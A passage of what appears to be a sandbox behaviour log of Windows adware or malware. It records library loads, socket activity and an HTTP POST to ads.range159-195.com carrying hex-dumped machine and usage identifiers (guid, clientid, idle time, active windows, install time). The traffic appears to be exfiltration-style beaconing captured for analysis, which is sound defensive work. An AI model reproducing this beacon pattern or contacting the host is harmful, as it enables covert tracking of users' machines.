+<dump_line offset="&#x24;0070" dump="21 81 51 16 6C 2F 9E 66 2C E1 5B 54 B7 D4 80 90 " ascii="!.Q.l/.f,.[T...."/>
+<dump_line offset="&#x24;0080" dump="14 F6 38 B0 F3 DA 35 31 D2 D3 EE 65 93 1A 30 65 " ascii="..8...51...e..0e"/>
+<dump_line offset="&#x24;0090" dump="B1 87 CC 11 CE 25 1A 60 29 F5 FF 37 1D 8D 0F 2A " ascii=".....&#x25;.&#x60;&#x29;..7...&#x2A;"/>
+<dump_line offset="&#x24;00A0" dump="D5 AB 29 B5 0C 67 26 82 54 0D 71 46 7B 8B 76 72 " ascii="..&#x29;..g&#x26;.T.qF&#x7B;.vr"/>
+<dump_line offset="&#x24;00B0" dump="73 25 DF CB 15 FC AE DB 59 9E F3 0B 45 8E 80 8C " ascii="s&#x25;......Y...E..."/>
+<dump_line offset="&#x24;00C0" dump="9B DB 7E 29 F1 6E 0B 96 59 DA 0D E3 5F 9D 7B 60 " ascii="..&#x7E;&#x29;.n..Y..._.&#x7B;&#x60;"/>
+<dump_line offset="&#x24;00D0" dump="91 D4 81 64 65 CE 04 61 D8 39 F5 4D DF B5 1C 88 " ascii="...de..a.9.M...."/>
+<dump_line offset="&#x24;00E0" dump="22 D2 59 DE BF C3 A7 69 1D 2F 29 37 9F 2E 7E 8A " ascii="&#x22;.Y....i./&#x29;7..&#x7E;."/>
+<dump_line offset="&#x24;00F0" dump="31 CE AD E4 58 8B E6 1F 53 75 2C 0D D3 EA 24 18 " ascii="1...X...Su,...&#x24;."/>
+<trimmed_bytes count="3536"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<com_create_instance inprocserver32="&#x25;SystemRoot&#x25;\system32\msxml3.dll" progid="Microsoft.XMLDOM.1.0" clsid="&#x7B;2933BF90-7B36-11D2-B20E-00C04F983E60&#x7D;" interfaceid="&#x7B;2933BF81-7B36-11D2-B20E-00C04F983E60&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Msxml30"/>
+<load_dll filename="C:\WINDOWS\system32\msxml3r.dll" successful="1" address="&#x24;3990001" end_address="&#x24;3990001" size="0" filename_hash="ec99a1263c2a531657b97fc11003fba0b37eb9be"/>
+<load_dll filename="C:\WINDOWS\system32\OLEAUT32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<create_open_file filetype="file" srcfile="\Device\Tcp6" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\NetBT_Tcpip_&#x7B;5D19E473-BE30-416B-B5C7-D8A091C41D2F&#x7D;" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetLocalTime"/>
+<create_socket socket="4294967295" socket_type="SOCK_DGRAM" successful="0"/>
+<create_open_file filetype="file" srcfile="\Device\RasAcd" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<get_host_by_name socket="0" remote_addr="64.34.228.126" hostname="ads.range159-195.com" buffer_len="4" successful="1"/>
+<create_socket socket="1844" socket_type="SOCK_STREAM" successful="1"/>
+<connect_socket socket="1844" remote_addr="64.34.228.126" remote_port="80" successful="0" winsock_result="10035"/>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="222">
+<dump_line offset="&#x24;0000" dump="50 4F 53 54 20 2F 74 62 61 2F 63 75 20 48 54 54 " ascii="POST /tba/cu HTT"/>
+<dump_line offset="&#x24;0010" dump="50 2F 31 2E 31 0D 0A 43 6F 6E 74 65 6E 74 2D 4C " ascii="P/1.1..Content-L"/>
+<dump_line offset="&#x24;0020" dump="65 6E 67 74 68 3A 20 33 35 30 35 31 0D 0A 43 6F " ascii="ength: 35051..Co"/>
+<dump_line offset="&#x24;0030" dump="6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C " ascii="ntent-Type: appl"/>
+<dump_line offset="&#x24;0040" dump="69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F " ascii="ication/x-www-fo"/>
+<dump_line offset="&#x24;0050" dump="72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 55 " ascii="rm-urlencoded..U"/>
+<dump_line offset="&#x24;0060" dump="73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C " ascii="ser-Agent: Mozil"/>
+<dump_line offset="&#x24;0070" dump="6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 " ascii="la/4.0 &#x28;compatib"/>
+<dump_line offset="&#x24;0080" dump="6C 65 3B 20 4D 53 49 45 20 37 2E 30 3B 20 36 2E " ascii="le; MSIE 7.0; 6."/>
+<dump_line offset="&#x24;0090" dump="30 2E 38 38 2E 30 3B 20 57 69 6E 64 6F 77 73 20 " ascii="0.88.0; Windows "/>
+<dump_line offset="&#x24;00A0" dump="4E 54 20 35 2E 31 29 0D 0A 41 63 63 65 70 74 2D " ascii="NT 5.1&#x29;..Accept-"/>
+<dump_line offset="&#x24;00B0" dump="45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70 0D 0A " ascii="Encoding: gzip.."/>
+<dump_line offset="&#x24;00C0" dump="48 6F 73 74 3A 20 61 64 73 2E 72 61 6E 67 65 31 " ascii="Host: ads.range1"/>
+<dump_line offset="&#x24;00D0" dump="35 39 2D 31 39 35 2E 63 6F 6D 0D 0A 0D 0A       " ascii="59-195.com...."/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="67 75 69 64 3D 35 34 32 45 36 36 31 31 38 32 45 " ascii="guid=542E661182E"/>
+<dump_line offset="&#x24;0010" dump="30 45 44 35 36 34 31 38 46 30 38 44 45 44 45 38 " ascii="0ED56418F08DEDE8"/>
+<dump_line offset="&#x24;0020" dump="32 43 39 38 44 34 42 37 37 26 76 65 72 73 69 6F " ascii="2C98D4B77&#x26;versio"/>
+<dump_line offset="&#x24;0030" dump="6E 3D 31 44 30 43 43 44 32 33 32 45 39 34 26 63 " ascii="n=1D0CCD232E94&#x26;c"/>
+<dump_line offset="&#x24;0040" dump="6C 69 65 6E 74 69 64 3D 42 36 30 37 46 46 34 30 " ascii="lientid=B607FF40"/>
+<dump_line offset="&#x24;0050" dump="39 42 45 34 32 32 39 41 31 43 42 44 26 74 69 6D " ascii="9BE4229A1CBD&#x26;tim"/>
+<dump_line offset="&#x24;0060" dump="65 3D 44 37 34 45 31 39 36 36 32 39 39 32 33 36 " ascii="e=D74E1966299236"/>
+<dump_line offset="&#x24;0070" dump="26 69 64 6C 65 3D 31 42 33 32 33 46 26 6C 6F 63 " ascii="&#x26;idle=1B323F&#x26;loc"/>
+<dump_line offset="&#x24;0080" dump="61 6C 65 3D 43 44 34 38 33 42 45 45 31 38 36 39 " ascii="ale=CD483BEE1869"/>
+<dump_line offset="&#x24;0090" dump="26 73 65 73 73 69 6F 6E 3D 42 33 34 42 26 61 63 " ascii="&#x26;session=B34B&#x26;ac"/>
+<dump_line offset="&#x24;00A0" dump="74 69 76 65 57 69 6E 64 6F 77 73 3D 41 33 31 36 " ascii="tiveWindows=A316"/>
+<dump_line offset="&#x24;00B0" dump="42 35 26 74 69 63 6B 73 42 6F 6F 74 3D 30 46 31 " ascii="B5&#x26;ticksBoot=0F1"/>
+<dump_line offset="&#x24;00C0" dump="33 45 31 37 36 45 35 43 32 35 32 26 74 69 63 6B " ascii="3E176E5C252&#x26;tick"/>
+<dump_line offset="&#x24;00D0" dump="73 41 6C 69 76 65 3D 37 41 35 44 33 32 39 38 36 " ascii="sAlive=7A5D32986"/>
+<dump_line offset="&#x24;00E0" dump="35 30 41 37 43 26 69 6E 73 74 61 6C 6C 54 69 6D " ascii="50A7C&#x26;installTim"/>
+<dump_line offset="&#x24;00F0" dump="65 3D 33 39 30 38 39 35 26 6C 61 75 6E 63 68 43 " ascii="e=390895&#x26;launchC"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="46 38 41 43 34 26 69 64 3D 31 38 36 33 46 39 42 " ascii="F8AC4&#x26;id=1863F9B"/>
+<dump_line offset="&#x24;0010" dump="37 46 32 30 30 39 46 26 69 64 3D 45 42 30 36 45 " ascii="7F2009F&#x26;id=EB06E"/>
+<dump_line offset="&#x24;0020" dump="39 36 30 43 43 33 42 32 34 26 69 64 3D 46 43 30 " ascii="960CC3B24&#x26;id=FC0"/>
+<dump_line offset="&#x24;0030" dump="35 36 30 43 43 33 35 32 32 39 32 26 69 64 3D 42 " ascii="560CC352292&#x26;id=B"/>
+<dump_line offset="&#x24;0040" dump="32 35 45 38 44 36 31 30 41 33 41 43 33 26 69 64 " ascii="25E8D610A3AC3&#x26;id"/>
+<dump_line offset="&#x24;0050" dump="3D 39 35 30 46 44 36 39 46 33 36 45 35 39 33 26 " ascii="=950FD69F36E593&#x26;"/>
+<dump_line offset="&#x24;0060" dump="69 64 3D 38 31 31 41 46 43 38 36 42 44 41 30 44 " ascii="id=811AFC86BDA0D"/>
+<dump_line offset="&#x24;0070" dump="46 26 69 64 3D 31 31 34 42 33 42 37 43 42 36 38 " ascii="F&#x26;id=114B3B7CB68"/>
+<dump_line offset="&#x24;0080" dump="39 34 44 26 69 64 3D 42 44 30 38 43 43 33 42 32 " ascii="94D&#x26;id=BD08CC3B2"/>
+<dump_line offset="&#x24;0090" dump="34 39 35 46 45 26 69 64 3D 36 46 34 38 31 45 36 " ascii="495FE&#x26;id=6F481E6"/>
+<dump_line offset="&#x24;00A0" dump="45 44 33 38 41 36 44 26 69 64 3D 37 36 30 32 39 " ascii="ED38A6D&#x26;id=76029"/>
+<dump_line offset="&#x24;00B0" dump="46 33 38 45 32 39 36 35 30 26 69 64 3D 31 33 30 " ascii="F38E29650&#x26;id=130"/>
+<dump_line offset="&#x24;00C0" dump="34 35 44 41 37 44 31 39 45 33 43 26 69 64 3D 43 " ascii="45DA7D19E3C&#x26;id=C"/>
+<dump_line offset="&#x24;00D0" dump="31 32 44 45 30 43 44 35 33 36 36 34 30 26 69 64 " ascii="12DE0CD536640&#x26;id"/>
+<dump_line offset="&#x24;00E0" dump="3D 30 42 35 44 39 44 36 41 30 44 37 41 44 30 26 " ascii="=0B5D9D6A0D7AD0&#x26;"/>
+<dump_line offset="&#x24;00F0" dump="69 64 3D 34 30 30 34 44 33 41 34 44 37 35 44 41 " ascii="id=4004D3A4D75DA"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="44 36 41 30 32 46 45 33 34 34 34 30 32 26 69 64 " ascii="D6A02FE344402&#x26;id"/>
+<dump_line offset="&#x24;0010" dump="3D 45 34 36 39 34 46 39 42 39 30 35 31 46 42 26 " ascii="=E4694F9B9051FB&#x26;"/>
+<dump_line offset="&#x24;0020" dump="69 64 3D 35 37 37 44 43 31 44 36 41 42 44 35 35 " ascii="id=577DC1D6ABD55"/>
+<dump_line offset="&#x24;0030" dump="31 26 69 64 3D 42 33 37 35 32 43 36 32 44 45 35 " ascii="1&#x26;id=B3752C62DE5"/>
+<dump_line offset="&#x24;0040" dump="42 43 36 26 69 64 3D 43 39 36 35 42 35 46 37 30 " ascii="BC6&#x26;id=C965B5F70"/>
+<dump_line offset="&#x24;0050" dump="46 39 43 30 37 26 69 64 3D 36 41 33 43 44 31 33 " ascii="F9C07&#x26;id=6A3CD13"/>
+<dump_line offset="&#x24;0060" dump="45 44 37 34 32 36 42 26 69 64 3D 39 42 31 38 44 " ascii="ED7426B&#x26;id=9B18D"/>
+<dump_line offset="&#x24;0070" dump="38 31 36 36 36 43 38 45 34 26 69 64 3D 35 44 30 " ascii="81666C8E4&#x26;id=5D0"/>
+<dump_line offset="&#x24;0080" dump="37 43 45 33 44 32 46 39 34 46 44 26 69 64 3D 38 " ascii="7CE3D2F94FD&#x26;id=8"/>
+<dump_line offset="&#x24;0090" dump="33 37 37 32 43 36 32 44 45 35 45 43 33 26 69 64 " ascii="3772C62DE5EC3&#x26;id"/>
+<dump_line offset="&#x24;00A0" dump="3D 44 32 32 46 43 43 35 30 36 30 34 34 38 36 26 " ascii="=D22FCC50604486&#x26;"/>
+<dump_line offset="&#x24;00B0" dump="69 64 3D 36 34 30 38 41 36 44 32 39 38 33 44 45 " ascii="id=6408A6D2983DE"/>
+<dump_line offset="&#x24;00C0" dump="37 26 69 64 3D 41 41 33 32 44 31 33 46 44 43 34 " ascii="7&#x26;id=AA32D13FDC4"/>
+<dump_line offset="&#x24;00D0" dump="33 36 41 26 69 64 3D 45 44 35 36 30 38 37 45 44 " ascii="36A&#x26;id=ED56087ED"/>
+<dump_line offset="&#x24;00E0" dump="30 41 30 33 32 26 69 64 3D 43 43 32 36 35 44 38 " ascii="0A032&#x26;id=CC265D8"/>
+<dump_line offset="&#x24;00F0" dump="44 44 38 38 36 43 38 26 69 64 3D 37 34 34 37 38 " ascii="DD886C8&#x26;id=74478"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="33 33 44 26 69 64 3D 45 31 32 42 45 32 43 46 35 " ascii="33D&#x26;id=E12BE2CF5"/>
+<dump_line offset="&#x24;0010" dump="38 36 31 34 34 26 69 64 3D 34 35 36 42 39 43 39 " ascii="86144&#x26;id=456B9C9"/>
+<dump_line offset="&#x24;0020" dump="44 35 38 46 46 42 41 26 69 64 3D 36 41 32 41 31 " ascii="D58FFBA&#x26;id=6A2A1"/>
+<dump_line offset="&#x24;0030" dump="33 38 33 35 33 38 38 44 41 26 69 64 3D 41 31 32 " ascii="3835388DA&#x26;id=A12"/>
+<dump_line offset="&#x24;0040" dump="38 45 32 43 46 35 38 36 36 34 36 26 69 64 3D 43 " ascii="8E2CF586646&#x26;id=C"/>
+<dump_line offset="&#x24;0050" dump="32 31 30 38 34 42 31 41 46 44 42 36 39 26 69 64 " ascii="21084B1AFDB69&#x26;id"/>
+<dump_line offset="&#x24;0060" dump="3D 33 38 36 34 46 42 42 36 46 45 30 32 39 44 26 " ascii="=3864FBB6FE029D&#x26;"/>
+<dump_line offset="&#x24;0070" dump="69 64 3D 32 39 31 30 41 39 37 37 44 36 31 33 36 " ascii="id=2910A977D6136"/>
+<dump_line offset="&#x24;0080" dump="46 26 69 64 3D 43 45 36 37 46 39 33 39 34 44 30 " ascii="F&#x26;id=CE67F9394D0"/>
+<dump_line offset="&#x24;0090" dump="37 32 32 26 69 64 3D 34 32 36 46 46 41 41 30 34 " ascii="722&#x26;id=426FFAA04"/>
+<dump_line offset="&#x24;00A0" dump="31 39 45 39 45 26 69 64 3D 38 44 33 34 34 37 36 " ascii="19E9E&#x26;id=8D34476"/>
+<dump_line offset="&#x24;00B0" dump="37 33 34 45 42 33 37 26 69 64 3D 41 36 37 30 35 " ascii="734EB37&#x26;id=A6705"/>
+<dump_line offset="&#x24;00C0" dump="44 43 32 44 46 41 34 44 37 26 69 64 3D 36 30 33 " ascii="DC2DFA4D7&#x26;id=603"/>
+<dump_line offset="&#x24;00D0" dump="39 43 45 38 39 34 32 37 31 41 39 26 69 64 3D 32 " ascii="9CE894271A9&#x26;id=2"/>
+<dump_line offset="&#x24;00E0" dump="43 30 32 36 32 43 44 33 34 32 30 39 33 26 69 64 " ascii="C0262CD342093&#x26;id"/>
+<dump_line offset="&#x24;00F0" dump="3D 32 38 35 34 41 43 34 35 33 39 39 45 36 39 26 " ascii="=2854AC45399E69&#x26;"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="38 42 35 46 31 30 36 39 37 30 35 26 69 64 3D 33 " ascii="8B5F1069705&#x26;id=3"/>
+<dump_line offset="&#x24;0010" dump="37 35 41 35 30 41 44 34 31 33 39 39 46 26 69 64 " ascii="75A50AD41399F&#x26;id"/>
+<dump_line offset="&#x24;0020" dump="3D 43 35 36 41 39 43 39 46 35 33 46 43 42 32 26 " ascii="=C56A9C9F53FCB2&#x26;"/>
+<dump_line offset="&#x24;0030" dump="69 64 3D 32 38 35 43 41 43 34 37 33 32 39 38 36 " ascii="id=285CAC4732986"/>
+<dump_line offset="&#x24;0040" dump="46 26 69 64 3D 45 44 32 32 38 42 44 43 38 30 43 " ascii="F&#x26;id=ED228BDC80C"/>
+<dump_line offset="&#x24;0050" dump="39 38 39 26 69 64 3D 36 43 30 30 36 32 43 46 33 " ascii="989&#x26;id=6C0062CF3"/>
+<dump_line offset="&#x24;0060" dump="46 32 36 39 31 26 69 64 3D 32 34 36 43 34 46 39 " ascii="F2691&#x26;id=246C4F9"/>
+<dump_line offset="&#x24;0070" dump="44 39 42 35 31 46 42 26 69 64 3D 30 32 36 35 46 " ascii="D9B51FB&#x26;id=0265F"/>
+<dump_line offset="&#x24;0080" dump="41 41 32 34 41 39 42 39 31 26 69 64 3D 36 43 33 " ascii="AA24A9B91&#x26;id=6C3"/>
+<dump_line offset="&#x24;0090" dump="32 44 39 34 36 36 31 33 44 45 37 26 69 64 3D 43 " ascii="2D946613DE7&#x26;id=C"/>
+<dump_line offset="&#x24;00A0" dump="41 30 35 35 33 45 41 36 37 43 38 33 44 26 69 64 " ascii="A0553EA67C83D&#x26;id"/>
+<dump_line offset="&#x24;00B0" dump="3D 42 31 32 30 45 32 43 44 35 33 36 33 34 36 26 " ascii="=B120E2CD536346&#x26;"/>
+<dump_line offset="&#x24;00C0" dump="69 64 3D 34 37 32 30 45 34 42 46 30 32 31 35 38 " ascii="id=4720E4BF02158"/>
+<dump_line offset="&#x24;00D0" dump="35 26 69 64 3D 43 38 36 33 46 42 42 34 46 35 30 " ascii="5&#x26;id=C863FBB4F50"/>
+<dump_line offset="&#x24;00E0" dump="37 39 44 26 69 64 3D 42 33 33 41 37 30 41 43 38 " ascii="79D&#x26;id=B33A70AC8"/>
+<dump_line offset="&#x24;00F0" dump="44 43 32 33 37 26 69 64 3D 32 44 32 34 38 42 44 " ascii="DC237&#x26;id=2D248BD"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="45 26 69 64 3D 42 36 33 33 43 34 33 42 34 42 35 " ascii="E&#x26;id=B633C43B4B5"/>
+<dump_line offset="&#x24;0010" dump="42 44 34 26 69 64 3D 44 42 31 39 44 38 31 45 36 " ascii="BD4&#x26;id=DB19D81E6"/>
+<dump_line offset="&#x24;0020" dump="41 43 46 45 33 26 69 64 3D 37 33 34 45 42 33 38 " ascii="ACFE3&#x26;id=734EB38"/>
+<dump_line offset="&#x24;0030" dump="33 34 44 32 32 31 45 26 69 64 3D 36 45 35 36 37 " ascii="34D221E&#x26;id=6E567"/>
+<dump_line offset="&#x24;0040" dump="38 44 41 41 31 33 36 46 41 26 69 64 3D 33 34 36 " ascii="8DAA136FA&#x26;id=346"/>
+<dump_line offset="&#x24;0050" dump="41 34 46 39 33 39 43 35 35 46 34 26 69 64 3D 33 " ascii="A4F939C55F4&#x26;id=3"/>
+<dump_line offset="&#x24;0060" dump="45 34 39 45 39 31 33 36 44 44 34 38 44 26 69 64 " ascii="E49E9136DD48D&#x26;id"/>
+<dump_line offset="&#x24;0070" dump="3D 38 31 30 45 41 35 44 44 35 44 41 34 44 42 26 " ascii="=810EA5DD5DA4DB&#x26;"/>
+<dump_line offset="&#x24;0080" dump="69 64 3D 34 30 36 44 41 33 33 41 46 38 41 31 34 " ascii="id=406DA33AF8A14"/>
+<dump_line offset="&#x24;0090" dump="31 26 69 64 3D 36 44 36 34 30 32 46 36 33 38 34 " ascii="1&#x26;id=6D6402F6384"/>
+<dump_line offset="&#x24;00A0" dump="32 30 33 26 69 64 3D 30 41 30 33 35 33 45 34 36 " ascii="203&#x26;id=0A0353E46"/>
+<dump_line offset="&#x24;00B0" dump="30 43 45 33 46 26 69 64 3D 34 44 36 31 30 32 46 " ascii="0CE3F&#x26;id=4D6102F"/>
+<dump_line offset="&#x24;00C0" dump="36 33 38 34 33 30 36 26 69 64 3D 31 44 31 34 36 " ascii="6384306&#x26;id=1D146"/>
+<dump_line offset="&#x24;00D0" dump="38 43 33 45 33 37 32 45 32 26 69 64 3D 44 33 31 " ascii="8C3E372E2&#x26;id=D31"/>
+<dump_line offset="&#x24;00E0" dump="31 42 32 41 45 44 41 36 43 37 35 26 69 64 3D 43 " ascii="1B2AEDA6C75&#x26;id=C"/>
+<dump_line offset="&#x24;00F0" dump="42 35 41 39 46 36 34 30 41 37 37 44 33 26 69 64 " ascii="B5A9F640A77D3&#x26;id"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="44 43 39 33 39 32 45 39 32 26 69 64 3D 42 37 34 " ascii="DC9392E92&#x26;id=B74"/>
+<dump_line offset="&#x24;0010" dump="30 31 30 36 46 32 37 39 38 33 45 26 69 64 3D 33 " ascii="0106F27983E&#x26;id=3"/>
+<dump_line offset="&#x24;0020" dump="46 34 44 31 33 36 38 44 35 38 31 36 33 26 69 64 " ascii="F4D1368D58163&#x26;id"/>
+<dump_line offset="&#x24;0030" dump="3D 37 31 32 45 45 44 43 42 35 34 36 32 34 34 26 " ascii="=712EEDCB546244&#x26;"/>
+<dump_line offset="&#x24;0040" dump="69 64 3D 46 31 35 45 44 39 38 38 36 31 30 32 33 " ascii="id=F15ED98861023"/>
+<dump_line offset="&#x24;0050" dump="42 26 69 64 3D 43 35 37 43 44 46 35 41 43 33 44 " ascii="B&#x26;id=C57CDF5AC3D"/>
+<dump_line offset="&#x24;0060" dump="36 41 34 26 69 64 3D 34 37 30 34 33 36 45 30 39 " ascii="6A4&#x26;id=470436E09"/>
+<dump_line offset="&#x24;0070" dump="30 35 35 45 38 26 69 64 3D 31 44 33 38 34 38 36 " ascii="055E8&#x26;id=1D38486"/>
+<dump_line offset="&#x24;0080" dump="33 33 38 45 46 33 38 26 69 64 3D 41 41 33 34 44 " ascii="338EF38&#x26;id=AA34D"/>
+<dump_line offset="&#x24;0090" dump="45 33 45 44 42 34 32 36 37 26 69 64 3D 43 46 36 " ascii="E3EDB4267&#x26;id=CF6"/>
+<dump_line offset="&#x24;00A0" dump="44 33 35 34 34 30 37 32 33 32 45 26 69 64 3D 30 " ascii="D354407232E&#x26;id=0"/>
+<dump_line offset="&#x24;00B0" dump="32 30 33 44 44 35 38 41 34 44 30 39 44 26 69 64 " ascii="203DD58A4D09D&#x26;id"/>
+<dump_line offset="&#x24;00C0" dump="3D 31 33 33 38 37 46 41 41 38 41 43 36 33 31 26 " ascii="=13387FAA8AC631&#x26;"/>
+<dump_line offset="&#x24;00D0" dump="69 64 3D 30 34 31 39 41 45 44 46 36 45 37 38 36 " ascii="id=0419AEDF6E786"/>
+<dump_line offset="&#x24;00E0" dump="43 26 69 64 3D 46 44 35 37 30 37 37 46 44 37 41 " ascii="C&#x26;id=FD57077FD7A"/>
+<dump_line offset="&#x24;00F0" dump="31 33 42 26 69 64 3D 44 31 36 33 33 41 46 44 41 " ascii="13B&#x26;id=D1633AFDA"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="4096">
+<dump_line offset="&#x24;0000" dump="69 64 3D 31 35 35 34 33 36 43 39 35 30 41 41 34 " ascii="id=155436C950AA4"/>
+<dump_line offset="&#x24;0010" dump="30 26 69 64 3D 42 30 36 41 41 43 33 31 46 41 41 " ascii="0&#x26;id=B06AAC31FAA"/>
+<dump_line offset="&#x24;0020" dump="32 34 30 26 69 64 3D 33 39 30 44 39 44 35 37 45 " ascii="240&#x26;id=390D9D57E"/>
+<dump_line offset="&#x24;0030" dump="42 36 33 43 30 26 69 64 3D 36 43 35 39 36 34 30 " ascii="B63C0&#x26;id=6C59640"/>
+<dump_line offset="&#x24;0040" dump="43 37 37 44 32 41 37 26 69 64 3D 38 30 37 30 34 " ascii="C77D2A7&#x26;id=80704"/>
+<dump_line offset="&#x24;0050" dump="43 30 31 32 39 32 41 36 42 26 69 64 3D 37 45 35 " ascii="C01292A6B&#x26;id=7E5"/>
+<dump_line offset="&#x24;0060" dump="38 37 37 44 31 41 43 33 30 46 45 26 69 64 3D 35 " ascii="877D1AC30FE&#x26;id=5"/>
+<dump_line offset="&#x24;0070" dump="36 31 44 36 33 37 45 36 33 41 43 37 41 26 69 64 " ascii="61D637E63AC7A&#x26;id"/>
+<dump_line offset="&#x24;0080" dump="3D 38 32 31 42 38 42 42 36 41 45 44 43 36 41 26 " ascii="=821B8BB6AEDC6A&#x26;"/>
+<dump_line offset="&#x24;0090" dump="69 64 3D 44 43 34 37 32 39 33 39 45 36 31 38 36 " ascii="id=DC472939E6186"/>
+<dump_line offset="&#x24;00A0" dump="41 26 69 64 3D 45 37 35 31 35 46 41 38 34 39 33 " ascii="A&#x26;id=E7515FA8493"/>
+<dump_line offset="&#x24;00B0" dump="33 39 46 26 69 64 3D 32 46 31 38 45 45 37 36 45 " ascii="39F&#x26;id=2F18EE76E"/>
+<dump_line offset="&#x24;00C0" dump="44 43 38 35 39 26 69 64 3D 39 39 34 42 32 42 39 " ascii="DC859&#x26;id=994B2B9"/>
+<dump_line offset="&#x24;00D0" dump="32 33 37 32 35 33 38 26 69 64 3D 42 33 30 33 35 " ascii="2372538&#x26;id=B3035"/>
+<dump_line offset="&#x24;00E0" dump="30 41 32 44 42 39 45 33 41 26 69 64 3D 35 45 30 " ascii="0A2DB9E3A&#x26;id=5E0"/>
+<dump_line offset="&#x24;00F0" dump="42 33 35 32 35 39 46 46 44 38 36 26 69 64 3D 33 " ascii="B35259FFD86&#x26;id=3"/>
+<trimmed_bytes count="3840"/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1844" buffer_len="2283">
+<dump_line offset="&#x24;0000" dump="37 34 35 38 33 45 35 26 69 64 3D 36 38 30 38 45 " ascii="74583E5&#x26;id=6808E"/>
+<dump_line offset="&#x24;0010" dump="38 39 30 35 36 45 38 36 35 26 69 64 3D 39 38 32 " ascii="89056E865&#x26;id=982"/>
+<dump_line offset="&#x24;0020" dump="30 42 31 30 35 31 36 38 33 35 42 26 69 64 3D 39 " ascii="0B10516835B&#x26;id=9"/>
+<dump_line offset="&#x24;0030" dump="38 36 36 46 34 42 37 46 35 30 32 39 43 26 69 64 " ascii="866F4B7F5029C&#x26;id"/>
+<dump_line offset="&#x24;0040" dump="3D 45 46 35 31 44 41 41 31 33 30 46 39 41 37 26 " ascii="=EF51DAA130F9A7&#x26;"/>
+<dump_line offset="&#x24;0050" dump="69 64 3D 39 36 35 39 43 32 35 32 41 39 34 35 33 " ascii="id=9659C252A9453"/>
+<dump_line offset="&#x24;0060" dump="34 26 69 64 3D 36 34 37 30 36 41 44 32 35 38 43 " ascii="4&#x26;id=64706AD258C"/>
+<dump_line offset="&#x24;0070" dump="32 44 33 26 69 64 3D 43 41 31 35 37 42 44 41 31 " ascii="2D3&#x26;id=CA157BDA1"/>
+<dump_line offset="&#x24;0080" dump="34 36 42 43 44 26 69 64 3D 32 44 34 45 33 32 45 " ascii="46BCD&#x26;id=2D4E32E"/>
+<dump_line offset="&#x24;0090" dump="42 31 39 36 43 44 36 26 69 64 3D 35 36 32 39 38 " ascii="B196CD6&#x26;id=56298"/>
+<dump_line offset="&#x24;00A0" dump="38 45 36 42 42 30 34 31 43 26 69 64 3D 41 44 35 " ascii="8E6BB041C&#x26;id=AD5"/>
+<dump_line offset="&#x24;00B0" dump="36 30 37 37 41 44 30 41 30 33 42 26 69 64 3D 42 " ascii="6077AD0A03B&#x26;id=B"/>
+<dump_line offset="&#x24;00C0" dump="33 34 35 42 43 38 45 34 41 32 33 31 38 26 69 64 " ascii="345BC8E4A2318&#x26;id"/>
+<dump_line offset="&#x24;00D0" dump="3D 33 31 37 34 30 41 32 34 32 39 36 37 44 36 26 " ascii="=31740A242967D6&#x26;"/>
+<dump_line offset="&#x24;00E0" dump="69 64 3D 43 35 37 37 44 46 35 46 43 34 44 33 41 " ascii="id=C577DF5FC4D3A"/>
+<dump_line offset="&#x24;00F0" dump="30 26 69 64 3D 36 41 30 41 35 43 45 39 36 37 43 " ascii="0&#x26;id=6A0A5CE967C"/>
+<trimmed_bytes count="2027"/>
+</send_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="872" successful="1">
